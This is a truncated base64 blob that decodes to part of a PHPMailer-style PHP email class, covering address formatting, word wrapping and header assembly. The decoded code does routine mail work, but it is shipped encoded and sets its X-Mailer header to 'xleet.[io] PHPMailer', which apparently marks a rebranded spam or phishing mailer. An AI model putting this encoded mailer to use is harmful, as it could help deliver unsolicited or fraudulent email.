i8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRUcmFuc2xhdGlvbnMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+bGFuZ3VhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBDcmVhdGUgcmVjaXBpZW50IGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZQogICAgICogQHBhcmFtIGFycmF5ICRhZGRyIEFuIGFycmF5IG9mIHJlY2lwaWVudCwKICAgICAqIHdoZXJlIGVhY2ggcmVjaXBpZW50IGlzIGEgMi1lbGVtZW50IGluZGV4ZWQgYXJyYXkgd2l0aCBlbGVtZW50IDAgY29udGFpbmluZyBhbiBhZGRyZXNzCiAgICAgKiBhbmQgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lLCBsaWtlOgogICAgICogYXJyYXkoYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpLCBhcnJheSgnem9lQGV4YW1wbGUuY29tJywgJ1pvZSBVc2VyJykpCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckFwcGVuZCgkdHlwZSwgJGFkZHIpCiAgICB7CiAgICAgICAgJGFkZHJlc3NlcyA9IGFycmF5KCk7CiAgICAgICAgZm9yZWFjaCAoJGFkZHIgYXMgJGFkZHJlc3MpIHsKICAgICAgICAgICAgJGFkZHJlc3Nlc1tdID0gJHRoaXMtPmFkZHJGb3JtYXQoJGFkZHJlc3MpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gJHR5cGUgLiAnOiAnIC4gaW1wbG9kZSgnLCAnLCAkYWRkcmVzc2VzKSAuICR0aGlzLT5MRTsKICAgIH0KCiAgICAvKioKICAgICAqIEZvcm1hdCBhbiBhZGRyZXNzIGZvciB1c2UgaW4gYSBtZXNzYWdlIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gYXJyYXkgJGFkZHIgQSAyLWVsZW1lbnQgaW5kZXhlZCBhcnJheSwgZWxlbWVudCAwIGNvbnRhaW5pbmcgYW4gYWRkcmVzcywgZWxlbWVudCAxIGNvbnRhaW5pbmcgYSBuYW1lCiAgICAgKiAgICAgIGxpa2UgYXJyYXkoJ2pvZUBleGFtcGxlLmNvbScsICdKb2UgVXNlcicpCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkckZvcm1hdCgkYWRkcikKICAgIHsKICAgICAgICBpZiAoZW1wdHkoJGFkZHJbMV0pKSB7IC8vIE5vIG5hbWUgcHJvdmlkZWQKICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMF0pOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJGFkZHJbMV0pLCAncGhyYXNlJykgLiAnIDwnIC4gJHRoaXMtPnNlY3VyZUhlYWRlcigKICAgICAgICAgICAgICAgICRhZGRyWzBdCiAgICAgICAgICAgICkgLiAnPic7CiAgICAgICAgfQogICAgfQoKICAgIC8qKgogICAgICogV29yZC13cmFwIG1lc3NhZ2UuCiAgICAgKiBGb3IgdXNlIHdpdGggbWFpbGVycyB0aGF0IGRvIG5vdCBhdXRvbWF0aWNhbGx5IHBlcmZvcm0gd3JhcHBpbmcKICAgICAqIGFuZCBmb3IgcXVvdGVkLXByaW50YWJsZSBlbmNvZGVkIG1lc3NhZ2VzLgogICAgICogT3JpZ2luYWwgd3JpdHRlbiBieSBwaGlsaXBwZS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJG1lc3NhZ2UgVGhlIG1lc3NhZ2UgdG8gd3JhcAogICAgICogQHBhcmFtIGludGVnZXIgJGxlbmd0aCBUaGUgbGluZSBsZW5ndGggdG8gd3JhcCB0bwogICAgICogQHBhcmFtIGJvb2xlYW4gJHFwX21vZGUgV2hldGhlciB0byBydW4gaW4gUXVvdGVkLVByaW50YWJsZSBtb2RlCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHdyYXBUZXh0KCRtZXNzYWdlLCAkbGVuZ3RoLCAkcXBfbW9kZSA9IGZhbHNlKQogICAgewogICAgICAgIGlmICgkcXBfbW9kZSkgewogICAgICAgICAgICAkc29mdF9icmVhayA9IHNwcmludGYoJyA9JXMnLCAkdGhpcy0+TEUpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRzb2Z0X2JyZWFrID0gJHRoaXMtPkxFOwogICAgICAgIH0KICAgICAgICAvLyBJZiB1dGYtOCBlbmNvZGluZyBpcyB1c2VkLCB3ZSB3aWxsIG5lZWQgdG8gbWFrZSBzdXJlIHdlIGRvbid0CiAgICAgICAgLy8gc3BsaXQgbXVsdGlieXRlIGNoYXJhY3RlcnMgd2hlbiB3ZSB3cmFwCiAgICAgICAgJGlzX3V0ZjggPSAoc3RydG9sb3dlcigkdGhpcy0+Q2hhclNldCkgPT0gJ3V0Zi04Jyk7CiAgICAgICAgJGxlbGVuID0gc3RybGVuKCR0aGlzLT5MRSk7CiAgICAgICAgJGNybGZsZW4gPSBzdHJsZW4oc2VsZjo6Q1JMRik7CgogICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmZpeEVPTCgkbWVzc2FnZSk7CiAgICAgICAgLy9SZW1vdmUgYSB0cmFpbGluZyBsaW5lIGJyZWFrCiAgICAgICAgaWYgKHN1YnN0cigkbWVzc2FnZSwgLSRsZWxlbikgPT0gJHRoaXMtPkxFKSB7CiAgICAgICAgICAgICRtZXNzYWdlID0gc3Vic3RyKCRtZXNzYWdlLCAwLCAtJGxlbGVuKTsKICAgICAgICB9CgogICAgICAgIC8vU3BsaXQgbWVzc2FnZSBpbnRvIGxpbmVzCiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgkdGhpcy0+TEUsICRtZXNzYWdlKTsKICAgICAgICAvL01lc3NhZ2Ugd2lsbCBiZSByZWJ1aWx0IGluIGhlcmUKICAgICAgICAkbWVzc2FnZSA9ICcnOwogICAgICAgIGZvcmVhY2ggKCRsaW5lcyBhcyAkbGluZSkgewogICAgICAgICAgICAkd29yZHMgPSBleHBsb2RlKCcgJywgJGxpbmUpOwogICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICRmaXJzdHdvcmQgPSB0cnVlOwogICAgICAgICAgICBmb3JlYWNoICgkd29yZHMgYXMgJHdvcmQpIHsKICAgICAgICAgICAgICAgIGlmICgkcXBfbW9kZSBhbmQgKHN0cmxlbigkd29yZCkgPiAkbGVuZ3RoKSkgewogICAgICAgICAgICAgICAgICAgICRzcGFjZV9sZWZ0ID0gJGxlbmd0aCAtIHN0cmxlbigkYnVmKSAtICRjcmxmbGVuOwogICAgICAgICAgICAgICAgICAgIGlmICghJGZpcnN0d29yZCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJHNwYWNlX2xlZnQgPiAyMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICRzcGFjZV9sZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiA9ICR0aGlzLT51dGY4Q2hhckJvdW5kYXJ5KCR3b3JkLCAkbGVuKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAxLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMiwgMSkgPT0gJz0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbiAtPSAyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHBhcnQgPSBzdWJzdHIoJHdvcmQsIDAsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHdvcmQgPSBzdWJzdHIoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICcgLiAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlIC49ICRidWYgLiAkc29mdF9icmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkYnVmID0gJyc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHdoaWxlIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGxlbmd0aCA8PSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJGxlbmd0aDsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRpc191dGY4KSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuID0gJHRoaXMtPnV0ZjhDaGFyQm91bmRhcnkoJHdvcmQsICRsZW4pOwogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2VpZiAoc3Vic3RyKCR3b3JkLCAkbGVuIC0gMSwgMSkgPT0gJz0nKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbGVuLS07CiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZWlmIChzdWJzdHIoJHdvcmQsICRsZW4gLSAyLCAxKSA9PSAnPScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRsZW4gLT0gMjsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkcGFydCA9IHN1YnN0cigkd29yZCwgMCwgJGxlbik7CiAgICAgICAgICAgICAgICAgICAgICAgICR3b3JkID0gc3Vic3RyKCR3b3JkLCAkbGVuKTsKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJHdvcmQpID4gMCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJHBhcnQgLiBzcHJpbnRmKCc9JXMnLCBzZWxmOjpDUkxGKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkcGFydDsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGJ1Zl9vID0gJGJ1ZjsKICAgICAgICAgICAgICAgICAgICBpZiAoISRmaXJzdHdvcmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGJ1ZiAuPSAnICc7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRidWYgLj0gJHdvcmQ7CgogICAgICAgICAgICAgICAgICAgIGlmIChzdHJsZW4oJGJ1ZikgPiAkbGVuZ3RoIGFuZCAkYnVmX28gIT0gJycpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1Zl9vIC4gJHNvZnRfYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgICAgICRidWYgPSAkd29yZDsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkZmlyc3R3b3JkID0gZmFsc2U7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJG1lc3NhZ2UgLj0gJGJ1ZiAuIHNlbGY6OkNSTEY7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJG1lc3NhZ2U7CiAgICB9CgogICAgLyoqCiAgICAgKiBGaW5kIHRoZSBsYXN0IGNoYXJhY3RlciBib3VuZGFyeSBwcmlvciB0byAkbWF4TGVuZ3RoIGluIGEgdXRmLTgKICAgICAqIHF1b3RlZC1wcmludGFibGUgZW5jb2RlZCBzdHJpbmcuCiAgICAgKiBPcmlnaW5hbCB3cml0dGVuIGJ5IENvbGluIEJyb3duLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kZWRUZXh0IHV0Zi04IFFQIHRleHQKICAgICAqIEBwYXJhbSBpbnRlZ2VyICRtYXhMZW5ndGggRmluZCB0aGUgbGFzdCBjaGFyYWN0ZXIgYm91bmRhcnkgcHJpb3IgdG8gdGhpcyBsZW5ndGgKICAgICAqIEByZXR1cm4gaW50ZWdlcgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gdXRmOENoYXJCb3VuZGFyeSgkZW5jb2RlZFRleHQsICRtYXhMZW5ndGgpCiAgICB7CiAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSBmYWxzZTsKICAgICAgICAkbG9va0JhY2sgPSAzOwogICAgICAgIHdoaWxlICghJGZvdW5kU3BsaXRQb3MpIHsKICAgICAgICAgICAgJGxhc3RDaHVuayA9IHN1YnN0cigkZW5jb2RlZFRleHQsICRtYXhMZW5ndGggLSAkbG9va0JhY2ssICRsb29rQmFjayk7CiAgICAgICAgICAgICRlbmNvZGVkQ2hhclBvcyA9IHN0cnBvcygkbGFzdENodW5rLCAnPScpOwogICAgICAgICAgICBpZiAoZmFsc2UgIT09ICRlbmNvZGVkQ2hhclBvcykgewogICAgICAgICAgICAgICAgLy8gRm91bmQgc3RhcnQgb2YgZW5jb2RlZCBjaGFyYWN0ZXIgYnl0ZSB3aXRoaW4gJGxvb2tCYWNrIGJsb2NrLgogICAgICAgICAgICAgICAgLy8gQ2hlY2sgdGhlIGVuY29kZWQgYnl0ZSB2YWx1ZSAodGhlIDIgY2hhcnMgYWZ0ZXIgdGhlICc9JykKICAgICAgICAgICAgICAgICRoZXggPSBzdWJzdHIoJGVuY29kZWRUZXh0LCAkbWF4TGVuZ3RoIC0gJGxvb2tCYWNrICsgJGVuY29kZWRDaGFyUG9zICsgMSwgMik7CiAgICAgICAgICAgICAgICAkZGVjID0gaGV4ZGVjKCRoZXgpOwogICAgICAgICAgICAgICAgaWYgKCRkZWMgPCAxMjgpIHsKICAgICAgICAgICAgICAgICAgICAvLyBTaW5nbGUgYnl0ZSBjaGFyYWN0ZXIuCiAgICAgICAgICAgICAgICAgICAgLy8gSWYgdGhlIGVuY29kZWQgY2hhciB3YXMgZm91bmQgYXQgcG9zIDAsIGl0IHdpbGwgZml0CiAgICAgICAgICAgICAgICAgICAgLy8gb3RoZXJ3aXNlIHJlZHVjZSBtYXhMZW5ndGggdG8gc3RhcnQgb2YgdGhlIGVuY29kZWQgY2hhcgogICAgICAgICAgICAgICAgICAgIGlmICgkZW5jb2RlZENoYXJQb3MgPiAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtYXhMZW5ndGggPSAkbWF4TGVuZ3RoIC0gKCRsb29rQmFjayAtICRlbmNvZGVkQ2hhclBvcyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRmb3VuZFNwbGl0UG9zID0gdHJ1ZTsKICAgICAgICAgICAgICAgIH0gZWxzZWlmICgkZGVjID49IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vIEZpcnN0IGJ5dGUgb2YgYSBtdWx0aSBieXRlIGNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgIC8vIFJlZHVjZSBtYXhMZW5ndGggdG8gc3BsaXQgYXQgc3RhcnQgb2YgY2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgJG1heExlbmd0aCA9ICRtYXhMZW5ndGggLSAoJGxvb2tCYWNrIC0gJGVuY29kZWRDaGFyUG9zKTsKICAgICAgICAgICAgICAgICAgICAkZm91bmRTcGxpdFBvcyA9IHRydWU7CiAgICAgICAgICAgICAgICB9IGVsc2VpZiAoJGRlYyA8IDE5MikgewogICAgICAgICAgICAgICAgICAgIC8vIE1pZGRsZSBieXRlIG9mIGEgbXVsdGkgYnl0ZSBjaGFyYWN0ZXIsIGxvb2sgZnVydGhlciBiYWNrCiAgICAgICAgICAgICAgICAgICAgJGxvb2tCYWNrICs9IDM7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAvLyBObyBlbmNvZGVkIGNoYXJhY3RlciBmb3VuZAogICAgICAgICAgICAgICAgJGZvdW5kU3BsaXRQb3MgPSB0cnVlOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkbWF4TGVuZ3RoOwogICAgfQoKICAgIC8qKgogICAgICogQXBwbHkgd29yZCB3cmFwcGluZyB0byB0aGUgbWVzc2FnZSBib2R5LgogICAgICogV3JhcHMgdGhlIG1lc3NhZ2UgYm9keSB0byB0aGUgbnVtYmVyIG9mIGNoYXJzIHNldCBpbiB0aGUgV29yZFdyYXAgcHJvcGVydHkuCiAgICAgKiBZb3Ugc2hvdWxkIG9ubHkgZG8gdGhpcyB0byBwbGFpbi10ZXh0IGJvZGllcyBhcyB3cmFwcGluZyBIVE1MIHRhZ3MgbWF5IGJyZWFrIHRoZW0uCiAgICAgKiBUaGlzIGlzIGNhbGxlZCBhdXRvbWF0aWNhbGx5IGJ5IGNyZWF0ZUJvZHkoKSwgc28geW91IGRvbid0IG5lZWQgdG8gY2FsbCBpdCB5b3Vyc2VsZi4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIHZvaWQKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldFdvcmRXcmFwKCkKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPldvcmRXcmFwIDwgMSkgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkdGhpcy0+QWx0Qm9keSA9ICR0aGlzLT53cmFwVGV4dCgkdGhpcy0+QWx0Qm9keSwgJHRoaXMtPldvcmRXcmFwKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICAgICAgJHRoaXMtPkJvZHkgPSAkdGhpcy0+d3JhcFRleHQoJHRoaXMtPkJvZHksICR0aGlzLT5Xb3JkV3JhcCk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBBc3NlbWJsZSBtZXNzYWdlIGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcgVGhlIGFzc2VtYmxlZCBoZWFkZXJzCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVIZWFkZXIoKQogICAgewogICAgICAgICRyZXN1bHQgPSAnJzsKCiAgICAgICAgaWYgKCR0aGlzLT5NZXNzYWdlRGF0ZSA9PSAnJykgewogICAgICAgICAgICAkdGhpcy0+TWVzc2FnZURhdGUgPSBzZWxmOjpyZmNEYXRlKCk7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0RhdGUnLCAkdGhpcy0+TWVzc2FnZURhdGUpOwoKICAgICAgICAvLyBUbyBiZSBjcmVhdGVkIGF1dG9tYXRpY2FsbHkgYnkgbWFpbCgpCiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbykgewogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG9hZGRyKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlNpbmdsZVRvQXJyYXlbXSA9ICR0aGlzLT5hZGRyRm9ybWF0KCR0b2FkZHIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgaWYgKGNvdW50KCR0aGlzLT50bykgPiAwKSB7CiAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciAhPSAnbWFpbCcpIHsKICAgICAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZWlmIChjb3VudCgkdGhpcy0+Y2MpID09IDApIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1RvJywgJ3VuZGlzY2xvc2VkLXJlY2lwaWVudHM6OycpOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdGcm9tJywgYXJyYXkoYXJyYXkodHJpbSgkdGhpcy0+RnJvbSksICR0aGlzLT5Gcm9tTmFtZSkpKTsKCiAgICAgICAgLy8gc2VuZG1haWwgYW5kIG1haWwoKSBleHRyYWN0IENjIGZyb20gdGhlIGhlYWRlciBiZWZvcmUgc2VuZGluZwogICAgICAgIGlmIChjb3VudCgkdGhpcy0+Y2MpID4gMCkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdDYycsICR0aGlzLT5jYyk7CiAgICAgICAgfQoKICAgICAgICAvLyBzZW5kbWFpbCBhbmQgbWFpbCgpIGV4dHJhY3QgQmNjIGZyb20gdGhlIGhlYWRlciBiZWZvcmUgc2VuZGluZwogICAgICAgIGlmICgoCiAgICAgICAgICAgICAgICAkdGhpcy0+TWFpbGVyID09ICdzZW5kbWFpbCcgb3IgJHRoaXMtPk1haWxlciA9PSAncW1haWwnIG9yICR0aGlzLT5NYWlsZXIgPT0gJ21haWwnCiAgICAgICAgICAgICkKICAgICAgICAgICAgYW5kIGNvdW50KCR0aGlzLT5iY2MpID4gMAogICAgICAgICkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5hZGRyQXBwZW5kKCdCY2MnLCAkdGhpcy0+YmNjKTsKICAgICAgICB9CgogICAgICAgIGlmIChjb3VudCgkdGhpcy0+UmVwbHlUbykgPiAwKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmFkZHJBcHBlbmQoJ1JlcGx5LVRvJywgJHRoaXMtPlJlcGx5VG8pOwogICAgICAgIH0KCiAgICAgICAgLy8gbWFpbCgpIHNldHMgdGhlIHN1YmplY3QgaXRzZWxmCiAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgIT0gJ21haWwnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1N1YmplY3QnLCAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIoJHRoaXMtPlN1YmplY3QpKSk7CiAgICAgICAgfQoKICAgICAgICBpZiAoJHRoaXMtPk1lc3NhZ2VJRCAhPSAnJykgewogICAgICAgICAgICAkdGhpcy0+bGFzdE1lc3NhZ2VJRCA9ICR0aGlzLT5NZXNzYWdlSUQ7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPmxhc3RNZXNzYWdlSUQgPSBzcHJpbnRmKCc8JXNAJXM+JywgJHRoaXMtPnVuaXF1ZWlkLCByYW5kKCkuJy5jb20nKTsKICAgICAgICB9CiAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTWVzc2FnZS1JRCcsICR0aGlzLT5sYXN0TWVzc2FnZUlEKTsKICAgICAgICBpZiAoIWlzX251bGwoJHRoaXMtPlByaW9yaXR5KSkgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdYLVByaW9yaXR5JywgJHRoaXMtPlByaW9yaXR5KTsKICAgICAgICB9CiAgICAgICAgaWYgKCR0aGlzLT5YTWFpbGVyID09ICcnKSB7CiAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoCiAgICAgICAgICAgICAgICAnWC1NYWlsZXInLAogICAgICAgICAgICAgICAgJ3hsZWV0Lltpb10gUEhQTWFpbGVyJwogICAgICAgICAgICApOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRteVhtYWlsZXIgPSB0cmltKCR0aGlzLT5YTWFpbGVyKTsKICAgICAgICAgICAgaWYgKCRteVhtYWlsZXIpIHsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1gtTWFpbGVyJywgJG15WG1haWxlcik7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkdGhpcy0+Q29uZmlybVJlYWRpbmdUbyAhPSAnJykgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdEaXNwb3NpdGlvbi1Ob3RpZmljYXRpb24tVG8nLCAnPCcgLiAkdGhpcy0+Q29uZmlybVJlYWRpbmdUbyAuICc+Jyk7CiAgICAgICAgfQoKICAgICAgICAvLyBBZGQgY3VzdG9tIGhlYWRlcnMKICAgICAgICBmb3JlYWNoICgkdGhpcy0+Q3VzdG9tSGVhZGVyIGFzICRoZWFkZXIpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgKICAgICAgICAgICAgICAgIHRyaW0oJGhlYWRlclswXSksCiAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKHRyaW0oJGhlYWRlclsxXSkpCiAgICAgICAgICAgICk7CiAgICAgICAgfQogICAgICAgIGlmICghJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnTUlNRS1WZXJzaW9uJywgJzEuMCcpOwogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5nZXRNYWlsTUlNRSgpOwogICAgICAgIH0KCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgdGhlIG1lc3NhZ2UgTUlNRSB0eXBlIGhlYWRlcnMuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldE1haWxNSU1FKCkKICAgIHsKICAgICAgICAkcmVzdWx0ID0gJyc7CiAgICAgICAgJGlzbXVsdGlwYXJ0ID0gdHJ1ZTsKICAgICAgICBzd2l0Y2ggKCR0aGlzLT5tZXNzYWdlX3R5cGUpIHsKICAgICAgICAgICAgY2FzZSAnaW5saW5lJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYXR0YWNoJzoKICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgIGNhc2UgJ2FsdF9hdHRhY2gnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L21peGVkOycpOwogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzFdIC4gJyInKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHQnOgogICAgICAgICAgICBjYXNlICdhbHRfaW5saW5lJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7CiAgICAgICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMV0gLiAnIicpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGRlZmF1bHQ6CiAgICAgICAgICAgICAgICAvLyBDYXRjaGVzIGNhc2